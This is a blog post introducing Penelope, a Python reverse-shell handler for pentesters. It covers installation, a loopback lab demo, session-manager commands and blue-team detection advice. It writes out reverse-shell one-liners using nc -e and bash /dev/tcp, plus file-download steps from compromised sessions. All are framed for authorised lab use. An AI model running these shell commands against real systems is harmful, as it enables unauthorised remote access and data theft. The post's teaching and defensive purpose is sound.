---
layout: post
title: "Penelope"
subtitle: "A modern reverse-shell handler for pentesters"
date: 2025-09-26 10:00:00
background: ""
tags: [posts]
category: tools
---

**Penelope** is a compact, Python-based reverse-shell *handler* / session manager designed to replace ad-hoc `nc` listeners. It focuses on PTY upgrades, session management, logging and convenient file transfer utilities - without heavy dependencies. Use it to manage **lab** shells; never use tools like this outside of authorised tests.
![](/img/blog_img/Penelope_img/img1.png)

**GitHub:** [https://github.com/brightio/penelope](https://github.com/brightio/penelope)

---

## Why this matters
If you've ever landed a reverse shell only to wrestle with broken arrow keys, no job control, or a brittle single connection, you know the friction. Penelope automates the boring parts (PTY upgrade, resize, basic file upload/download, session listing) so you can focus on enumeration and escalation. Many CTF and pentest workflows gain from this ergonomics boost.

---

### Quick facts
- **Type:** Reverse-shell handler / session manager (single Python script).  
- **Language:** Python (requires Python 3.6+).  
- **Install:** drop the script on a Unix host or install via `pipx` from the GitHub repo.  
- **Platforms:** Linux, macOS (Unix-like systems).

---

## What Penelope gives you (features you’ll actually use)
- **Session manager:** list active sessions, interact / background, spawn multiple listeners.  
- **Automatic TTY/PTY upgrades:** attempts to turn a raw socket into a usable terminal (resizes, `pty.spawn` style behavior).  
- **File transfer & serving:** upload or download files/folders, and serve files over HTTP from your machine (`-s` switch).  
- **Activity logging:** record interactions for later review (handy for writeups and audits).  
- **Extras / Modules:** integrations and helper modules (e.g., for use with Metasploit or custom scripts).


---

## Installing Penelope (quick)
Minimal, dependency-free approach (runs the raw script):

```bash
# from your attack/lab machine (review the file before running)
wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py -O ~/bin/penelope.py
chmod +x ~/bin/penelope.py
# (optional) add a symlink to a directory in your PATH
ln -s ~/bin/penelope.py ~/.local/bin/penelope
```

Or install via `pipx`:
```bash
pipx install git+https://github.com/brightio/penelope
```
Always review the script before running. The canonical repo and README are the source of truth.

---

## Conceptual workflow
Below is a **safe, local** demonstration you can run on your lab VM / personal machine to see how a listener + client behave. This uses loopback (127.0.0.1) so nothing touches the internet.

1. Open a terminal and start Penelope on port `4444` (listen on localhost):
```bash
penelope -i 127.0.0.1 -p 4444
```

2. In another terminal on the same machine, create a simple client that connects back. If your netcat supports `-e`, you can use:
```bash
nc 127.0.0.1 4444 -e /bin/bash
```
If `nc -e` is unavailable on your system, use a safe shell loopback variant on a disposable lab VM (avoid using these commands on production systems):
```bash
# safe local bash connect (lab-only)
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

3. Switch to the Penelope terminal: you should see a new session listed. Use the session manager commands to `interact <id>`, background the session, or use file-transfer helpers. Test basic terminal behavior (arrow keys, history, simple editors) inside the managed session.

> Reminder: Do **not** run these commands against external or production hosts. Keep tests confined to isolated lab networks.

---

### Example usage & common commands
Penelope's CLI and exact flags may evolve; this section shows the typical workflows you will encounter.

```bash
# Start Penelope listening on all interfaces, port 4444, and enable logging
penelope -p 4444 --log penelope.log

# Start listening on a specific IP and port
penelope -i 10.10.14.10 -p 5555

# Interact with an existing session from the session manager
# (typical pseudo-commands inside the manager)
list           # show active sessions
interact 1     # attach to session ID 1
background 1   # background session ID 1
download 1 /tmp/loot.zip  # pull /tmp/loot.zip from session 1
upload 1 localfile /tmp/remote_name  # push localfile -> remote
```

Check `penelope --help` or the project README for the most current flags and usage notes.

---

## Pros / Why you might adopt Penelope
- **Ergonomics:** session manager + file transfer saves time during writeups and CTFs.  
- **Lightweight:** pure-Python, minimal external deps.  
- **Designed for testers:** features map to real RCE/revshell pain points (stability, TTY upgrades).

## Cons / Caveats
- **Not a silver bullet:** complex post-exploitation workflows still require other tools (Metasploit, pwncat, socat, manual scripting).  
- **Potential fingerprinting:** custom handlers can be detectable by defenders if used against real targets - only use in authorised tests.  
- **Maintenance / trust:** always audit any tool you run during engagements (it runs with whatever privileges your user has).

### Alternatives & when to use each
- **Netcat (nc):** ubiquitous; quick but fragile and lacks session management. Use only for quick ad-hoc needs.  
- **pwncat / pwncat-revshell:** more featureful; focused on interactive exploitation workflows. Choose when you need advanced post-exploitation features.  
- **Socat:** powerful for port forwarding and advanced socket handling; more complex syntax.  
- **Metasploit handler:** heavyweight, full post-exploitation ecosystem; not ideal for small CTF tasks.

---

## Defensive / blue-team perspective
If you’re writing this as a white-hat post, include detection and mitigation notes:
- **Network monitoring:** look for unusual long-lived outbound TCP sessions, especially to atypical ports or after suspicious HTTP requests.  
- **Egress filtering:** block unnecessary outbound ports and limit allowed external services from high-risk hosts.  
- **Endpoint monitoring:** track parent/child processes that spawn network sockets or suspicious Python interpreters invoked from web apps or services.  
- **Hunting signatures:** session managers often perform predictable sequences (pty upgrades, specific file transfer handshakes) - create detections for repeated patterns.

Always correlate telemetry before taking automated actions.
